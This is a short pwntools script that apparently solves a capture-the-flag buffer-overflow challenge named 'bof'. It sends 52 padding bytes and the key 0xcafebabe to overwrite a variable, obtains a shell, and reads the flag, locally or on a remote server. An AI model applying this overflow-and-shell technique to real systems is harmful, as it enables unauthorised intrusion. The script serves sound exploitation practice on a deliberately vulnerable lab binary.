#!/usr/bin/env python3

from pwn import *

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify your GDB script here for debugging
gdbscript = '''
b *0x56555654
continue
'''.format(**locals())


# Set up pwntools for the correct architecture
exe = './bof'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
#context.log_level = 'debug'

# ===========================================================
#                    START OF EXPLOIT
# ===========================================================


KEY = 0xcafebabe

io = start()
io.recvuntil(b':\n', timeout=1)

# overflow the buffer
payload = b'A' * 52
payload += KEY.to_bytes(4, 'little')
io.sendline(payload)

# shell is open, cat the flag
io.sendline(b"cat flag")
flag = io.recvline()
io.close()

print(flag.decode())




